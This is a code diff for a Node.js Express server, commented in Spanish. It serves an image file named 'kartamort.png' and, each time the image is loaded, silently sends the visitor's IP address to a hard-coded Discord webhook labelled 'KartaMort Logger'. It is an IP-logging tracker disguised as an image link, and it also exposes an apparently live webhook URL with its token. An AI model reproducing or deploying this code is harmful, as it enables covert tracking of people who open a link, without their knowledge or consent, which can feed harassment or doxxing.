@@ -1,46 +1,39 @@
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
 const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args)); // Importar 'node-fetch'
 const app = express();
 
-// Ruta para servir la imagen
-app.get('/img/:id.png', (req, res) => {
-  // Usamos una ruta absoluta para asegurarnos que el archivo se encuentra correctamente
-  const imagePath = path.join(__dirname, 'kartamort.png');  // Ruta absoluta a la imagen
+// Configuramos Express para servir archivos estáticos desde la carpeta 'public'
+app.use(express.static(path.join(__dirname, 'public')));
 
-  // Leemos la imagen usando fs.readFile
-  fs.readFile(imagePath, (err, data) => {
+// Ruta para servir la imagen (esto debería funcionar ahora)
+app.get('/img/kartamort.png', (req, res) => {
+  // Puedes usar directamente la ruta del archivo si está en la carpeta 'public'
+  const imagePath = path.join(__dirname, 'public', 'kartamort.png');
+
+  // Si la imagen no existe, mostramos un error
+  res.sendFile(imagePath, (err) => {
     if (err) {
-      // En caso de error al leer el archivo, devolvemos un error 500
-      res.status(500).send('Error leyendo la imagen');
-      return;
+      console.error('Error al servir la imagen:', err);
+      return res.status(500).send('Error al servir la imagen');
     }
 
-    // Obtenemos la IP del visitante
+    // Enviar la IP al webhook de Discord
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-
-    // Configuramos el webhook de Discord
     const payload = {
       username: "KartaMort Logger",
       content: `IP: ${ip}`
     };
 
-    // Usamos fetch para enviar la IP al webhook de Discord
     fetch("https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI", {
       method: "POST",
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
-    }).catch(err => console.error("Error en el webhook: ", err));
-
-    // Establecemos el tipo de contenido como 'image/png'
-    res.setHeader('Content-Type', 'image/png');
-    // Enviamos la imagen al cliente
-    res.send(data);
+    }).catch(err => console.error("Error en el webhook:", err));
   });
 });
 
-// Configuramos el puerto del servidor
+// Configuramos el puerto
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
   console.log(`Servidor corriendo en el puerto ${port}`);
